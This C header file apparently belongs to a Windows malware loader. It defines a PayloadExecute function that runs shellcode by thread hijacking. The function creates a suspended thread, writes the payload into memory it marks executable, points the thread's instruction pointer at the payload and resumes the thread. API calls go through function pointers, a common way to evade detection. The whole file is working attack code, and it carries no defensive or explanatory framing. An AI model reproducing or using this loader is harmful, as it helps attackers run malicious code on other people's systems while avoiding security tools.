#pragma once
#include "api.h"
#include <stdio.h>
#include <Windows.h>

DWORD WINAPI DummyFunction(LPVOID lpParam) {
    return 0;
}

BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN OPTIONAL HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {
	
	PVOID    pAddress         = NULL;
	DWORD    dwOldProtection  = NULL;
	CONTEXT  ThreadCtx        = { 
			.ContextFlags = CONTEXT_CONTROL 
		};

    hThread = pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		fflush(stdout);
		return FALSE;
	}

    // Allocating memory for the payload
	pAddress = pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		fflush(stdout);
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!pVirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		fflush(stdout);
		return FALSE;
	}

	// Getting the original thread context
	if (!pGetThreadContext(hThread, &ThreadCtx)){
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		fflush(stdout);
		return FALSE;
	}

		// Updating the next instruction pointer to be equal to the payload's address 
		ThreadCtx.Rip = (DWORD64)pAddress;

	// Updating the new thread context
	if (!pSetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		fflush(stdout);
		return FALSE;
	}

    // Resuming suspended thread, so that it runs our shellcode
	if(pResumeThread(hThread) == ((DWORD)-1)){
        printf("[!] ResumeThread Failed With Error : %d \n", GetLastError());
		fflush(stdout);
        return FALSE;
    }

	if (phThread)
		*phThread = hThread;

	return TRUE;
}